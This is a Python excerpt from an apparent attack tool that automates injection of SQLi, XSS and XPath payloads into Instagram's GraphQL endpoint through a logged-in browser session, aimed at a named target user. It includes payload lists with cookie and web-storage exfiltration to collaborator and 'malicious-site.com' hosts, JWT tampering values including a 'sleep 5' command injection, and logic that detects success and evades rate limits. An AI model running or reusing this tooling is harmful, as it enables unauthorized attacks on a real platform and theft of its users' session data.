...
# === ADVANCED Security Testing Payloads (Use With EXTREME Caution & Authorization!) ===
# WARNING: Requires EXPLICIT WRITTEN AUTHORIZATION. Unauthorized testing is illegal.
# Techniques: Various encodings, case mixing, comments, specific DB functions, event handlers, DOM targets, exfil placeholders.
# Effectiveness VARIES MASSIVELY based on target defenses (WAF, sanitization, encoding).

# --- Advanced SQLi Payloads ---
ADVANCED_SQLI_PAYLOADS = [
    # Basic Bypasses & Tautologies
    "' OR 1=1 -- ", "' OR '1'='1' -- ", "admin' #", "' OR 'a'='a'--", "`admin` or 1=1#",
    # UNION-based (Highly dependent on column count/type)
    "' uNiOn sElEcT 1,@@version,3 -- ",  # MySQL Version
    "' Union select Null, version(), Null -- ",  # PostgreSQL Version
    "' uNIoN SeleCT nULL,NaMe,Null fRoM users WHERE '1'='1' -- ",  # Generic Table Data
    "' /**/UNION/**/ SELECT /**/Null,/**/table_name,/**/Null FROM information_schema.tables -- ",  # Comments
    # Error-based (DB Dependant)
    # MySQL Double-query error
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND(0)*2), 0x7e, (SELECT user())) )a GROUP BY a)b)--",
    # Trigger conversion error (MySQL/PgSQL)
    "' AND 1=CAST(database() AS int)--",
    # Cartesian Product load
    "' AND 1=(select count(*) from information_schema.columns A, information_schema.columns B) -- ",
    # Blind Techniques
    "' AND SLEEP(5)='0",  # Time-based MySQL/PgSQL
    "' AnD substr(@@version,1,1) = '5' -- ",  # Content-based Blind
    # Conditional time-based
    "' OR if(substring(database(),1,1)='p', sleep(5), 0) #",
    "'; wAItFOr DeLAy '0:0:5' --",  # Time-based SQL Server
    # XXE-via-Oracle Blind OOB
    "|| (select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % TTT SYSTEM \"http://YOUR_COLLABORATOR.oastify.com/?leak=\"> %TTT;]>'),'/l') from dual) ||'",
    # Encoding/Obfuscation
    "%27 OR 1=1 -- ",  # URL Encoded '
    "CHAR(39) OR CHAR(49)=CHAR(49)--",  # ASCII Code bypass
    # Concatenation (SQL Server)
    "EXEC('s' + 'e' + 'l' + 'e' + 'c' + 't @@version');",
]

# --- Advanced XSS Payloads ---
ADVANCED_XSS_PAYLOADS = [
    # Basic & HTML5
    "<DeTaiLs/OpeN/OnToggLe=alert`XSS-by-Pyrite-Details`>",
    "<audio src/onerror=alert(document.domain)>",
    "<video src=1 onerror=alert(1337)>",
    # SVG OOB Ping
    "<svg/onload=fetch('//YOUR_COLLABORATOR.oastify.com/?svg')>",
    # Script Context Bypasses
    "</script><script>alert('XSS-TagBreak')</script>",
    # JS String termination + injection
    "';alert(localStorage.getItem('sensitive_token'));//",
    # Template literal break + exfil
    "`};alert(JSON.stringify(sessionStorage));{//",
    "\\'-alert('XSS-SlashQuote')//",
    # Encoding & Obfuscation
    # eval(alert('XSS-Eval'))
    "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,45,69,118,97,108,39,41))\">",
    # Case mixing, comments for JS URI
    "JaVaScRiPt:/*--><*/prompt(/**/document.domain/*`*/);",
    # HTML Entity encoded JS URI
    "<img src=\"javascript:alert('XSS-HTML_Entity')\">",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLWJhc2U2NCcpPC9zY3JpcHQ+\">Click Me Base64</a>",  # Data URI Base64
    # Event Handler Variations
    "<body onpageshow=alert(1)>", "<iframe onload=alert(1)>", "<div onmouseover=alert(1)>",
    # DOM Manipulation Examples (inside onerror/onload etc.)
    "...onerror=document.body.innerHTML='<h1>Pyrite Was Here</h1>'>",
    "...onload=document.getElementById('targetDiv').style.display='none'>",
    "...onerror=document.forms[0].action='//malicious-site.com/steal'>",
    # Cookie/Storage Exfil (Replace COLLABORATOR domain)
    "<script>new Image().src='//YOUR_COLLABORATOR.oastify.com/?ck='+btoa(document.cookie);</script>",
    "<script>fetch('//YOUR_COLLABORATOR.oastify.com/ls', {method:'POST', body:JSON.stringify(localStorage)});</script>",
    "<svg/onload=fetch('//YOUR_COLLABORATOR.oastify.com/ss/'+btoa(JSON.stringify(sessionStorage)))>",
    # Polyglot (Attempts to work in multiple contexts)
    "-->'\"</style></script><svg onload=alert(1)>",
    "javascript:/**/'/*\"/*`/*'/*--><details/open/ontoggle=prompt`1`>/**/"
]

# --- XPath Injection Payloads ---
ADVANCED_XPATH_PAYLOADS = [
    # Basic Logic/Selection
    "' or '1'='1", "\" or 0=0 or \"x\"=\"x", "user' or '1'='1", "password' or '1'='1",
    # Node Selection / Existence Checks
    "' or count(//user)=1 or ''='",  # Does user node exist?
    # Select specific nodes / try variations
    "admin'] | //user[position()=1] | //*[contains(local-name(),'pass')][1]",
    # Check password length for admin user
    "*[@id='admin' and string-length(password)>0]",
    # Data Extraction (context dependent)
    # Check first letter of user node name
    "' or substring(name(//user[1]), 1, 1)='u' or ''='",
    # Blind XPath (Time-based is very rare/specific, Error-based more likely if processor reveals errors)
    # Trigger error? (Processor dependent)
    "' and contains(substring-before(local-name(/), '=')) or ''='",
    # Booleanization / Function Abuse (Processor Dependent)
    "' or translate('a','a','b')='b",  # Test function execution
]

# --- JWT Related Examples (NOT a full attack module) ---
# These test *specific known JWT library vulnerabilities* or assumptions.
# Requires modification of Authorization headers or cookies.
JWT_MODIFICATION_EXAMPLES = {
    # Base64 encoded, used as FIRST part of token
    "ALG_NONE_HEADER": '{"alg":"none","typ":"JWT"}',
    # Replace PK, use where server accepts public key via param. Base64 header.
    "ALG_HS256_TO_RS256_HEADER": '{"alg":"HS256","typ":"JWT", "pk":"-----BEGIN PUBLIC KEY-----\n[YOUR_GENERATED_PUBLIC_KEY]\n-----END PUBLIC KEY-----"}',
    # Send token with signature removed
    "SIG_STRIPPING_PAYLOAD": "[ORIGINAL_PAYLOAD_PART].",
    # Payloads below go into claims (the middle part, base64 encoded JSON)
    # SQLi via key ID parameter
    "JWT_PAYLOAD_KID_SQLI": '{"user":"admin", "kid":"../../path/to/key\' UNION SELECT sql_key FROM secrets --"}',
    # Command injection via key ID parameter
    "JWT_PAYLOAD_KID_CMD": '{"user":"admin", "kid":"key.pem; sleep 5"}',
}
...
class EnhancedInstagramManager:
    ...
    def perform_advanced_injection_test(self, target_username, attack_type='XSS',
                                         graphql_query_hash=None, injection_point_var='after',
                                         http_method='GET', oast_url=None): # Added oast_url param
        """
        Performs Advanced Injection Tests (SQLi, XSS, XPath) against GraphQL endpoints.
        Uses manually provided OAST URL and supports proxying through Burp (via settings).

        WARNING: ETHICAL & AUTHORIZED USE ONLY. (...)

        Args:
            target_username (str): The target Instagram profile username.
            attack_type (str): Type of attack ('XSS', 'SQLI', 'XPATH').
            graphql_query_hash (str, optional): Specific GraphQL hash. Defaults to outdated hash.
            injection_point_var (str): Key in GraphQL 'variables' (default: 'after').
            http_method (str): 'GET' or 'POST' (default: 'GET').
            oast_url (str, optional): Manually obtained OAST URL (e.g., from Burp Collaborator).

        Returns:
            dict: {'status': str, 'details': str or None, 'success_payload': str or None, 'oast_used': bool}
                  Requires manual OAST verification if oast_used is True.
        """
        # --- Validate State & Inputs (as before) ---
        if not self.driver or not self.current_account:
            logger.error("[AdvInject] Login required.")
            return {'status': "Login Required", 'details': "No active WebDriver session.", 'success_payload': None, 'oast_used': False}
        # (Keep other input validation: username, attack_type, http_method)
        attack_type = attack_type.upper()
        if attack_type not in ['XSS', 'SQLI', 'XPATH']:
             return {'status': "Invalid Mode", ...}
        if http_method not in ['GET', 'POST']:
              return {'status': "Invalid HTTP Method", ...}


        provided_oast_url = None
        oast_info_log = "(OAST URL Not Provided)"
        if oast_url and isinstance(oast_url, str) and oast_url.strip().startswith(("http://", "https://")):
            provided_oast_url = oast_url.strip()
            logger.info(f"[AdvInject] Using Manual OAST URL: {provided_oast_url}")
            oast_info_log = f"(Using OAST URL: {provided_oast_url})"
        elif oast_url:
             logger.warning(f"[AdvInject] Invalid OAST URL provided: '{oast_url}'. Ignoring.")

        # Select Payloads & Query Hash (as before)
        payloads_map = {'XSS': ADVANCED_XSS_PAYLOADS, 'SQLI': ADVANCED_SQLI_PAYLOADS, 'XPATH': ADVANCED_XPATH_PAYLOADS}
        payloads = payloads_map.get(attack_type, [])
        # (Add check if payloads list is empty)

        target_hash = graphql_query_hash
        using_default_hash = False
        if not target_hash:
             target_hash = "58b6785bea111c67129decbe6a448951" # Outdated hash
             logger.warning(f"[AdvInject] Using default/outdated hash: {target_hash}")
             using_default_hash = True

        # --- Prep Logging, Get User ID ---
        target_username = target_username.strip()
        current_user_log = self.current_account.get('username', 'Unk')[:10]
        burp_proxy_enabled = self.settings.get("use_burp_proxy", False)
        proxy_log_info = f"Burp Proxy: {'ENABLED' if burp_proxy_enabled else 'Disabled'}"
        log_prefix = f"AdvInject-{attack_type}-{current_user_log}-to-{target_username[:10]}"

        logger.info(f"[{log_prefix}] Starting test. Target='{target_username}', Hash='{target_hash}', InjPoint='{injection_point_var}', {proxy_log_info} {oast_info_log}")

        logger.debug(f"[{log_prefix}] Getting User ID...")
        target_data = self.extract_user_data(target_username)
        user_id = target_data.get("user_id")
        if not user_id:
             status_details = target_data.get('extraction_status', 'Extraction Failed')
             logger.error(f"[{log_prefix}] User ID Fail ({status_details}). Abort.")
             return {'status': "User ID Fail", 'details': status_details, 'success_payload': None, 'oast_used': False}
        logger.info(f"[{log_prefix}] Target User ID: {user_id}")


        # --- Iterate Payloads & Execute ---
        graphql_endpoint = self.platform_urls['graphql']
        found_potential_success_inband = False # Tracks reflection, errors, time-outs
        first_success_payload_inband = None
        any_oast_payload_sent = False # Track if any OAST-modified payload was sent
        rate_limit_or_block = False

        for i, original_payload in enumerate(payloads):
            if rate_limit_or_block: break

            current_payload = original_payload
            oast_marker_used_this_req = False

            # Modify payload if placeholder exists AND user provided OAST URL
            if provided_oast_url and BURP_COLLABORATOR_PLACEHOLDER in original_payload:
                current_payload = original_payload.replace(BURP_COLLABORATOR_PLACEHOLDER, provided_oast_url)
                any_oast_payload_sent = True
                oast_marker_used_this_req = True

            payload_display = f"'{current_payload[:80]}...' ({i+1}/{len(payloads)})"
            logger.info(f"[{log_prefix}] Test {i+1}: {payload_display}" + (" [OAST MODIFIED]" if oast_marker_used_this_req else ""))

            variables = {"id": user_id, "first": 1}
            variables[injection_point_var] = current_payload
            # (Log variables debug if needed)

            # Prepare & Execute JS (Keep JS construction, CSRF logic, script execution, and error handling for TimeoutException/WebDriverException from previous response)
            js_result = None
            ...
            try:
                ...
                if http_method == 'GET':
                     ...
                     full_url = f"{graphql_endpoint}?query_hash={target_hash}&variables={encoded_vars}"
                     post_body_json_for_script = 'null'
                else: # POST
                     full_url = f"{graphql_endpoint}?query_hash={target_hash}"
                     # Assuming nested structure {"variables": "{\"id\": ...}"}
                     post_body_dict = {"variables": json.dumps(variables)}
                     post_body_json_for_script = json.dumps(post_body_dict)

                # --- Get CSRF ---
                csrf_token = ""
                csrf_cookie = next((c['value'] for c in self.driver.get_cookies() if c['name'] == 'csrftoken'), None)
                if csrf_cookie: csrf_token = csrf_cookie

                # --- Construct JS ---
                js_script = f"""
                const url = `{full_url}`; const method = `{http_method}`; const body = {post_body_json_for_script};
                const controller = new AbortController(); const timeoutMs = 30000; /* 30s */
                const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
                try {{
                    const options = {{ method: method, headers: {{ 'Accept': 'application/json, text/plain, */*', 'X-Requested-With': 'XMLHttpRequest', 'X-CSRFToken': `{csrf_token}` }}, signal: controller.signal }};
                    if (method === 'POST') {{ options.headers['Content-Type'] = 'application/json;charset=utf-8'; options.body = JSON.stringify(body); }}
                    const response = await fetch(url, options); clearTimeout(timeoutId);
                    const responseText = await response.text();
                    return {{ status: response.status, headers: Object.fromEntries(response.headers.entries()), text: responseText, error: null }};
                }} catch (error) {{ clearTimeout(timeoutId); let errorType = error.name === 'AbortError' ? 'FetchTimeout' : error.name; return {{ status: -1, headers: null, text: null, error: `JS (${{errorType}}): ${{error.message}}` }}; }}
                """
            ...
            # --- Handle Script Exec Errors (Keep Timeout/WD exceptions handling) ---
            except TimeoutException:
                # ... (same blind SQLi check as before) ...
                is_potential_blind = (attack_type == 'SQLI' and any(kw in current_payload.upper() for kw in ['SLEEP', 'WAITFOR', 'PG_SLEEP', 'BENCHMARK']))
                logger.warning(f"[{log_prefix}] WD TIMEOUT for {payload_display}.")
                if is_potential_blind:
                     logger.critical(f"[!!! POTENTIAL BLIND SQLi (WD TIMEOUT) !!!] Payload: {original_payload}")
                     found_potential_success_inband = True
                     if not first_success_payload_inband: first_success_payload_inband = original_payload
                continue # Try next
            except WebDriverException as wd_ex:
                # ... (same session check as before) ...
                error_msg = str(wd_ex).lower(); logger.error(f"[{log_prefix}] WD Ex for {payload_display}: {wd_ex}", ...)
                if any(term in error_msg for term in ["disconnected", ...]):
                     logger.critical(f"[{log_prefix}] Session lost! Aborting."); self.close_driver()
                     return {'status': "WebDriver Error", 'details': "Session lost", ..., 'oast_used': any_oast_payload_sent}
                continue # Try next
            except Exception as py_ex: logger.error(f"[{log_prefix}] Python Err for {payload_display}: {py_ex}", ...); continue


            # --- Analyze In-Band Result (No OAST confirmation here) ---
            if script_execution_success and js_result:
                js_error = js_result.get('error')
                status = js_result.get('status', -1)
                body = js_result.get('text', '') or ""

                # Check for JS errors first (e.g., fetch timeout, maybe rate limits reported here)
                if js_error:
                    if any(term in js_error.lower() for term in ['rate limit', 'throttled', 'forbidden', 'too many requests']):
                         logger.error(f"[{log_prefix}] Rate Limit/Block via JS Error: {js_error}. STOPPING."); rate_limit_or_block = True; break
                    # Don't treat JS FetchTimeout as SQLi confirmation
                    elif 'FetchTimeout' in js_error: logger.warning(f"[{log_prefix}] JS Fetch timed out (30s) for {payload_display}")
                    else: logger.warning(f"[{log_prefix}] JS Error Reported: {js_error}")

                # Analyze HTTP status and body if no JS error
                elif status != -1:
                    if status in [429, 403, 503] or any(term in body for term in ["Try Again Later", "Please wait"]):
                         logger.error(f"[{log_prefix}] Received HTTP {status} or block message. STOPPING."); rate_limit_or_block = True; break

                    # Potential Success - XSS Reflection (Check original payload for clarity)
                    if attack_type == 'XSS' and original_payload in body:
                         logger.critical(f"[!!! POTENTIAL XSS (REFLECTION) !!!] Payload: {original_payload}")
                         # Add screenshot if needed
                         found_potential_success_inband = True;
                         if not first_success_payload_inband: first_success_payload_inband = original_payload

                    # Potential Success - Server Error (SQLi/XPath Hint)
                    error_hints = ['sqlstate', 'syntax error', 'mysql', 'ora-', 'unclosed quotation', 'exception', 'xpath evaluation', 'internal server error', 'runtime error', 'division by zero']
                    if status >= 500 or any(hint in body.lower() for hint in error_hints):
                         logger.error(f"[!!! POTENTIAL {attack_type} (SERVER ERROR) !!!] Status: {status}. Payload: {original_payload}")
                         # Add screenshot if needed
                         found_potential_success_inband = True;
                         if not first_success_payload_inband: first_success_payload_inband = original_payload

                    # Log if OAST payload was *sent* successfully (Needs manual check)
                    if oast_marker_used_this_req and 200 <= status < 400:
                        logger.info(f"[{log_prefix}] Successfully SENT OAST payload (Status {status}).--> MANUALLY check Collaborator/OAST service for URL: '{provided_oast_url}' <--")


            # --- Delay ---
            if not rate_limit_or_block:
                 self._random_delay(min_sec=self.settings["random_delay_min"] * 1.8, max_sec=self.settings["random_delay_max"] * 2.5)


        # --- Final Summary & Return ---
        details = f"Test Type: {attack_type}, Target Hash: {target_hash}"
        if rate_limit_or_block:
             final_status = "Rate Limited / Blocked"
             details += ". Stopped early."
        elif found_potential_success_inband:
             final_status = f"Potential Success ({attack_type} - In-Band)"
             details += f". Found potential indicators (Reflection/Error/Blind Timeout). First potential payload: '{first_success_payload_inband}'. MANUAL VERIFICATION REQUIRED."
             logger.critical(f"[{log_prefix}] Attack Finished. {details}")
        else: # Tested all, no obvious in-band hits
             final_status = "Tested (No Obvious In-Band Vulnerability)"
             details += f". Completed {len(payloads)} tests. No clear reflection, errors, or blind timeouts detected automatically."

        if any_oast_payload_sent:
             details += f" | OAST Payloads Sent: YES.--> MANUALLY Check OAST URL '{provided_oast_url}' for interactions! <--"
             logger.warning(f"[{log_prefix}] OAST payloads were sent during the test. Verification is MANUAL using your Collaborator client / OAST service for URL: {provided_oast_url}")
        else:
              details += " | OAST Payloads Sent: NO."

        if using_default_hash: details += " | Note: Used default/outdated query hash."

        logger.info(f"[{log_prefix}] Test run finished. Final Status: {final_status}")

        return {
            'status': final_status,
            'details': details,
            'success_payload': first_success_payload_inband, # Report only in-band detected payload
            'oast_used': any_oast_payload_sent
        }

    # (Keep get_jwt_testing_guidance method as is)            
